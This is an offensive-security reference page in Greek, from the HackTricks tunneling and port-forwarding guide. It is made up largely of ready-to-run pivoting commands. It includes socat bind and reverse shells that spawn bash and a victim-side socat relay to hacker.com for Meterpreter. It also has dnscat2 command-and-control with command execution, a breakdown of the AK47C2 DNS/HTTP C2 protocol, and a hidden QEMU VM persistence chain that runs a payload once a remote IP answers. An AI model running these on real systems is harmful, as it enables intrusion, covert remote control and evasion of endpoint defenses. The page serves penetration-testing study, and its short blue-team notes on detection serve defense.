# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> **ICMP** και **SYN** scans δεν μπορούν να περαστούν μέσω socks proxies, οπότε πρέπει να **disable ping discovery** (`-Pn`) και να ορίσουμε **TCP scans** (`-sT`) για να λειτουργήσει αυτό.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH γραφική σύνδεση (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Άνοιγμα νέου Port σε SSH Server --> Άλλο port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Τοπική port --> Συμβιβασμένος host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Οπουδήποτε
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Χρήσιμο για να αποκτήσετε reverse shells από εσωτερικούς hosts μέσω ενός DMZ προς τον host σας:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Χρειάζεστε **root σε αμφότερες τις συσκευές** (καθώς θα δημιουργήσετε νέες interfaces) και το sshd config πρέπει να επιτρέπει το root login:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Ενεργοποιήστε το forwarding στην πλευρά του Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ορισμός νέας route στην πλευρά του client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Ασφάλεια – Terrapin Attack (CVE-2023-48795)**
> Η 2023 Terrapin downgrade attack μπορεί να επιτρέψει σε έναν man-in-the-middle να παραποιήσει το αρχικό SSH handshake και να εγχύσει δεδομένα σε **any forwarded channel** (`-L`, `-R`, `-D`). Βεβαιωθείτε ότι τόσο ο client όσο και ο server είναι patched (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ή απενεργοποιήστε ρητά τους ευάλωτους αλγορίθμους `chacha20-poly1305@openssh.com` και `*-etm@openssh.com` στο `sshd_config`/`ssh_config` πριν βασιστείτε σε SSH tunnels.

## SSHUTTLE

Μπορείτε να **tunnel** μέσω **ssh** όλη την **traffic** προς ένα **subnetwork** μέσω ενός host.\
Για παράδειγμα, forwarding όλης της **traffic** που κατευθύνεται προς 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Σύνδεση με ιδιωτικό κλειδί
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Τοπικό port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Ένας άλλος τρόπος:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Άνοιξε μια θύρα στο teamserver που ακούει σε όλες τις διεπαφές και μπορεί να χρησιμοποιηθεί για **να δρομολογήσει την κίνηση μέσω του beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Σε αυτή την περίπτωση, η **port ανοίγεται στον beacon host**, όχι στο Team Server και η κίνηση αποστέλλεται στο Team Server και από εκεί στον υποδεικνυόμενο host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
- Το reverse port forward του Beacon έχει σχεδιαστεί για να **tunnel traffic to the Team Server, not for relaying between individual machines**.
- Η κίνηση είναι **tunneled within Beacon's C2 traffic**, συμπεριλαμβανομένων των P2P links.
- Δεν απαιτούνται **Admin privileges** για τη δημιουργία reverse port forwards σε υψηλές θύρες.

### rPort2Port local

> [!WARNING]
> Σε αυτήν την περίπτωση, η **θύρα ανοίγεται στον beacon host**, όχι στον Team Server και η **κίνηση αποστέλλεται στο Cobalt Strike client** (όχι στον Team Server) και από εκεί στον υποδεικνυόμενο host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeOrg

[https://github.com/sensepost/reGeOrg](https://github.com/sensepost/reGeOrg)

Πρέπει να ανεβάσετε ένα web file tunnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Μπορείτε να το κατεβάσετε από τη σελίδα releases του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Πρέπει να χρησιμοποιήσετε την **ίδια έκδοση για client και server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Χρησιμοποιήστε την ίδια έκδοση για agent και proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Δέσμευση και Ακρόαση Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Πρόσβαση στις Τοπικές Θύρες του Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel.
Το tunnel ξεκινά από το victim.\
Δημιουργείται ένας socks4 proxy στο 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot μέσω **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port μέσω socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter μέσω SSL με Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Μπορείτε να παρακάμψετε έναν **non-authenticated proxy** εκτελώντας αυτή τη γραμμή αντί της τελευταίας στην κονσόλα του θύματος:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Δημιουργήστε πιστοποιητικά και στις δύο πλευρές: Client και Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Συνδέστε την τοπική θύρα SSH (22) με τη θύρα 443 του attacker host
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Είναι σαν μια κονσολική έκδοση του PuTTY (οι επιλογές είναι πολύ παρόμοιες με αυτές ενός ssh client).

Καθώς αυτό το binary θα εκτελεστεί στο victim και είναι ssh client, πρέπει να ανοίξουμε την υπηρεσία ssh και την port μας ώστε να έχουμε μια reverse connection. Στη συνέχεια, για να προωθήσουμε μόνο μια locally accessible port σε μια port στο μηχάνημά μας:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Απαιτείται local admin (για οποιοδήποτε port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Πρέπει να έχετε **RDP access στο σύστημα**.\
Κατεβάστε:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από τη λειτουργία Remote Desktop Service των Windows. DVC είναι υπεύθυνο για **διοχέτευση πακέτων μέσω της σύνδεσης RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Στον client computer σας φορτώστε **`SocksOverRDP-Plugin.dll`** όπως παρακάτω:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Τώρα μπορούμε να **συνδεθούμε** στη **victim** μέσω **RDP** χρησιμοποιώντας **`mstsc.exe`**, και θα πρέπει να λάβουμε ένα **μήνυμα** που λέει ότι το **SocksOverRDP plugin είναι ενεργοποιημένο**, και θα **ακούει** στη **127.0.0.1:1080**.

**Συνδεθείτε** μέσω **RDP** και ανεβάστε & εκτελέστε στη μηχανή **victim** το binary `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Τώρα, επιβεβαιώστε στη μηχανή σας (attacker) ότι η θύρα 1080 ακούει:
```
netstat -antb | findstr 1080
```
Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να κάνετε proxy την κυκλοφορία μέσω εκείνης της θύρας.**

## Proxify Windows GUI Apps

Μπορείτε να κάνετε Windows GUI apps να πλοηγούνται μέσω proxy χρησιμοποιώντας [**Proxifier**](https://www.proxifier.com/).\
Στο **Profile -> Proxy Servers** προσθέστε τη διεύθυνση IP και τη θύρα του SOCKS server.\
Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να proxify και τις συνδέσεις προς τις IP που θέλετε να proxify.

## NTLM proxy bypass

Το προηγουμένως αναφερθέν εργαλείο: **Rpivot**\
**OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο διαμόρφωσης:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Αυθεντικοποιείται απέναντι σε έναν proxy και δεσμεύει τοπικά μια port που προωθείται στην εξωτερική υπηρεσία που ορίζετε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το tool της επιλογής σας μέσω αυτής της port.\
Για παράδειγμα, προωθεί την port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Now, αν ρυθμίσετε, για παράδειγμα, στο victim την υπηρεσία **SSH** να ακούει στο port 443, μπορείτε να συνδεθείτε σε αυτή μέσω του attacker port 2222.\
Μπορείτε επίσης να χρησιμοποιήσετε έναν **meterpreter** που συνδέεται στο localhost:443 και ο attacker ακούει στο port 2222.

## YARP

Ένας reverse proxy δημιουργημένος από την Microsoft. Μπορείτε να τον βρείτε εδώ: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Απαιτείται Root και στα δύο συστήματα για να δημιουργηθούν tun adapters και να tunnel δεδομένα μεταξύ τους χρησιμοποιώντας DNS queries.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Το tunnel θα είναι πολύ αργό. Μπορείτε να δημιουργήσετε μια συμπιεσμένη SSH σύνδεση μέσω αυτού του tunnel χρησιμοποιώντας:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Δημιουργεί ένα κανάλι C\&C μέσω DNS. Δεν χρειάζεται root privileges.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Στο PowerShell**

Μπορείτε να χρησιμοποιήσετε [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) για να εκτελέσετε έναν dnscat2 client στο PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding με dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Αλλαγή DNS του proxychains

Το proxychains παρεμβαίνει στην κλήση libc `gethostbyname` και δρομολογεί τα tcp DNS requests μέσω του socks proxy. Από **προεπιλογή** ο **DNS** server που χρησιμοποιεί το proxychains είναι **4.2.2.2** (hardcoded). Για να το αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε την IP. Αν βρίσκεστε σε περιβάλλον **Windows** μπορείτε να ορίσετε την IP του **domain controller**.

## Tunnels in Go

https://github.com/hotnops/gtunnel

### Προσαρμοσμένο DNS TXT / HTTP JSON C2 (AK47C2)

Ο actor Storm-2603 δημιούργησε ένα **dual-channel C2 ("AK47C2")** που καταχράται *μόνο* εξερχόμενη κίνηση **DNS** και **plain HTTP POST** – δύο πρωτόκολλα που σπάνια μπλοκάρονται σε εταιρικά δίκτυα.

1. **DNS mode (AK47DNS)**
• Γεννά ένα τυχαίο 5-χαρακτήρων SessionID (π.χ. `H4T14`).
• Προσθέτει στην αρχή `1` για *task requests* ή `2` για *results* και συγκολλά διάφορα πεδία (flags, SessionID, computer name).
• Κάθε πεδίο είναι **XOR-encrypted with the ASCII key `VHBD@H`**, hex-encoded, και ενώνεται με τελείες – τελικά καταλήγει στο domain που ελέγχεται από τον επιτιθέμενο:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Τα requests χρησιμοποιούν `DnsQuery()` για **TXT** (και fallback **MG**) records.
• Όταν η απάντηση ξεπερνά τα 0xFF bytes, το backdoor **fragments** τα δεδομένα σε κομμάτια των 63-byte και εισάγει τους δείκτες:
`s<SessionID>t<TOTAL>p<POS>` ώστε ο C2 server να μπορεί να τα αναδιατάξει.

2. **HTTP mode (AK47HTTP)**
• Σχηματίζει ένα JSON περίβλημα:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Ολόκληρο το blob γίνεται XOR-`VHBD@H` → hex → και αποστέλλεται ως το σώμα ενός **`POST /`** με header `Content-Type: text/plain`.
• Η απάντηση ακολουθεί την ίδια κωδικοποίηση και το πεδίο `cmd` εκτελείται με `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Ψάξτε για ασυνήθιστα **TXT queries** των οποίων η πρώτη ετικέτα είναι μακρύ hexadecimal και πάντα καταλήγει σε ένα σπάνιο domain.
• Ένα σταθερό XOR key ακολουθούμενο από ASCII-hex ανιχνεύεται εύκολα με YARA: `6?56484244?484` (`VHBD@H` σε hex).
• Για HTTP, σημαδέψτε τα text/plain POST bodies που είναι καθαρό hex και έχουν μήκος πολλαπλάσιο των δύο bytes.

{{#note}}
Ολόκληρο το κανάλι εμπίπτει σε **standard RFC-compliant queries** και διατηρεί κάθε ετικέτα υπο-τομέα κάτω από 63 bytes, καθιστώντας το κρυφό στους περισσότερους DNS logs.
{{#endnote}}

## ICMP Tunneling

### Hans

https://github.com/friedrich/hans\
https://github.com/albertzak/hanstunnel

Απαιτείται root και στα δύο συστήματα για τη δημιουργία tun adapters και για το tunneling των δεδομένων μεταξύ τους χρησιμοποιώντας ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Κατεβάστε το από εδώ**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **είναι ένα εργαλείο για να εκθέσετε λύσεις στο Internet με μία εντολή στη γραμμή εντολών.**\
_Τα URI έκθεσης μοιάζουν με:_ **UID.ngrok.io**

### Εγκατάσταση

- Δημιουργήστε έναν λογαριασμό: https://ngrok.com/signup
- Λήψη client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Βασικές χρήσεις

**Τεκμηρίωση:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Επίσης είναι δυνατό να προστεθεί authentication και TLS, αν χρειάζεται._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Έκθεση αρχείων μέσω HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Χρήσιμο για XSS,SSRF,SSTI ..._\
Απευθείας από το stdout ή στη HTTP διεπαφή [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling εσωτερικής HTTP υπηρεσίας
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml απλό παράδειγμα διαμόρφωσης

Ανοίγει 3 tunnels:

- 2 TCP
- 1 HTTP με έκθεση στατικών αρχείων από /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Ο daemon `cloudflared` της Cloudflare μπορεί να δημιουργήσει εξερχόμενα tunnels που εκθέτουν **τοπικές υπηρεσίες TCP/UDP** χωρίς να απαιτούνται κανόνες firewall για εισερχόμενη κίνηση, χρησιμοποιώντας το edge της Cloudflare ως σημείο συνάντησης. Αυτό είναι πολύ χρήσιμο όταν το firewall εξόδου επιτρέπει μόνο κίνηση HTTPS ενώ οι εισερχόμενες συνδέσεις είναι μπλοκαρισμένες.

### Σύντομο one-liner για tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Μόνιμα tunnels με DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Ξεκινήστε τον connector:
```bash
cloudflared tunnel run mytunnel
```
Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) είναι ένα ενεργά συντηρούμενο Go reverse-proxy που υποστηρίζει **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. Από την **v0.53.0 (May 2024)** μπορεί να λειτουργήσει ως **SSH Tunnel Gateway**, ώστε ένας target host να ανοίγει ένα reverse tunnel χρησιμοποιώντας μόνο τον stock OpenSSH client — χωρίς επιπλέον binary.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Χρήση της νέας πύλης SSH (χωρίς το frpc binary)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Η παραπάνω εντολή εκθέτει την θύρα του θύματος **8080** ως **attacker_ip:9000** χωρίς την ανάπτυξη επιπλέον εργαλείων – ιδανικό για living-off-the-land pivoting.

## Κρυφοί τούνελ βασισμένα σε VM με QEMU

Το user-mode networking του QEMU (`-netdev user`) υποστηρίζει μια επιλογή που ονομάζεται `hostfwd` που **δεσμεύει μια TCP/UDP θύρα στο *host* και την προωθεί στο *guest***. Όταν το guest τρέχει πλήρες SSH daemon, ο κανόνας hostfwd σας δίνει ένα προσωρινό SSH jump box που υπάρχει εξ ολοκλήρου μέσα σε ένα προσωρινό VM – ιδανικό για να κρύψετε C2 traffic από EDR επειδή όλη η κακόβουλη δραστηριότητα και τα αρχεία παραμένουν στο virtual disk.

### Γρήγορη εντολή μίας γραμμής
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Η εντολή παραπάνω εκκινεί μια εικόνα **Tiny Core Linux** (`tc.qcow2`) στη μνήμη RAM.  
• Η θύρα **2222/tcp** στο Windows host προωθείται διαφανώς στην **22/tcp** μέσα στο guest.  
• Από την πλευρά του επιτιθέμενου, ο στόχος απλώς εκθέτει τη θύρα 2222· οποιαδήποτε πακέτα που φτάνουν εκεί διαχειρίζονται από τον SSH server που τρέχει στο VM.

### Εκκίνηση αθόρυβα μέσω VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Η εκτέλεση του script με `cscript.exe //B update.vbs` κρατάει το παράθυρο κρυφό.

### Επίμονη παρουσία εντός του guest

Επειδή το Tiny Core είναι stateless, οι επιτιθέμενοι συνήθως:

1. Τοποθετούν το payload στο `/opt/123.out`
2. Προσθέτουν στο `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Προσθέτουν το `home/tc` και το `opt` στο `/opt/filetool.lst` ώστε το payload να πακετάρεται στο `mydata.tgz` κατά τον shutdown.

### Γιατί αυτό αποφεύγει την ανίχνευση

• Μόνο δύο μη υπογεγραμμένα εκτελέσιμα (`qemu-system-*.exe`) αγγίζουν τον δίσκο· δεν εγκαθίστανται οδηγοί ή υπηρεσίες.  
• Τα προϊόντα ασφάλειας στο host βλέπουν **καλοήθη κίνηση loopback** (το πραγματικό C2 τερματίζεται μέσα στο VM).  
• Οι memory scanners ποτέ δεν αναλύουν τον χώρο διεργασιών του κακόβουλου προγράμματος γιατί βρίσκεται σε διαφορετικό λειτουργικό σύστημα (OS).

### Συμβουλές για τον αμυνόμενο

